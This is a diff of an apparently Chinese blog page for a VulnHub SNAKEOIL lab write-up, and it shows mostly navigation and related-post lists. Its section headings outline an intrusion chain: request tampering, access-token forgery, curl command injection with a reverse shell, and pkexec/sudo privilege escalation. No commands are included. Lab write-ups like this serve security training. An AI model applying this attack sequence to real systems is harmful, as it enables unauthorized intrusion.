用更大的字典又扫了一遍目录，发现两个新目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">9.</span> <span class="toc-text"> 抓取数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95%E4%B8%BApost"><span class="toc-number">10.</span> <span class="toc-text"> 修改提交方法为 POST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-rce%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-curl%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">11.</span> <span class="toc-text"> 003 RCE 命令注入 curl 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-pkexec-sudo-su%E6%8F%90%E6%9D%83"><span class="toc-number">12.</span> <span class="toc-text"> 004 pkexec、sudo su 提权</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="toc-number">1.</span> <span class="toc-text"> 确认攻击目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 网站信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burp-%E7%AF%A1%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">3.</span> <span class="toc-text"> BURP 篡改数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-type-%E5%AD%97%E6%AE%B5%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text"> Content-Type 字段利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%A4%A7%E4%BF%A1%E6%81%AF%E9%9D%A2"><span class="toc-number">5.</span> <span class="toc-text"> 扩大信息面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-access_token"><span class="toc-number">6.</span> <span class="toc-text"> 伪造 access_token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-rce-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">7.</span> <span class="toc-text"> CURL RCE 命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pkexec-%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text"> pkexec 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">9.</span> <span class="toc-text"> 配置文件泄露</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li class="active"><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB GROTESQUE2">VULNHUB GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB VENUS">VULNHUB VENUS</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB TYPO">VULNHUB TYPO</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB GROTESQUE3">VULNHUB GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB INFERNO">VULNHUB INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB JETTY">VULNHUB JETTY</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB CENGBOX3">VULNHUB CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB ORASI">VULNHUB ORASI</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB LOOZ">VULNHUB LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB CEREAL">VULNHUB CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB DURIAN">VULNHUB DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB TORANDO">VULNHUB TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB WARZONE3">VULNHUB WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB GITROOT">VULNHUB GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></li>
+          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li class="active"><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -489,12 +513,12 @@ Sudo su 通过 patrick 的密码来提到 root<br>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2021/11/01/VULNHUB/115%20THALES/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -516,16 +540,6 @@ Sudo su 通过 patrick 的密码来提到 root<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
@@ -536,60 +550,10 @@ Sudo su 通过 patrick 的密码来提到 root<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2020/04/01/MBTI/ESFJ%E8%A7%A3%E8%AF%BB/" title="ESFJ解读">ESFJ解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/137%20VENUS/" title="VULNHUB VENUS">VULNHUB VENUS</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2020/04/01/MBTI/ISTP%E8%A7%A3%E8%AF%BB/" title="ISTP解读">ISTP解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></span>
+    <span><a href="/2023/05/10/SAFE/Security%20URL/" title="信息安全 网址">信息安全 网址</a></span>
   </li>
 
       
@@ -606,10 +570,70 @@ Sudo su 通过 patrick 的密码来提到 root<br>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/139%20INFERNO/" title="VULNHUB INFERNO">VULNHUB INFERNO</a></span>
+    <span><a href="/2021/11/01/VULNHUB/112%20THOTH/" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/58%E3%80%8A%E6%B5%AE%E5%A3%AB%E5%BE%B7%E3%80%8B%E6%AD%8C%E5%BE%B7/" title="《浮士德》歌德">《浮士德》歌德</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2020/04/01/MBTI/MBTI%E4%B8%8E%E5%85%AB%E7%BB%B4/" title="MBTI与八维">MBTI与八维</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2020/04/01/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E5%90%8D%E8%AF%8D/" title="心理学名词">心理学名词</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></span>
   </li>
 
   </ul>
@@ -634,13 +658,13 @@ Sudo su 通过 patrick 的密码来提到 root<br>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">746k 字</span>
+    <span title="站点总字数">748k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">20:44</span>
+    <span title="站点阅读时长">20:46</span>
   </div>
 
 <!--   自定义开启一个网站的运行时间 -->
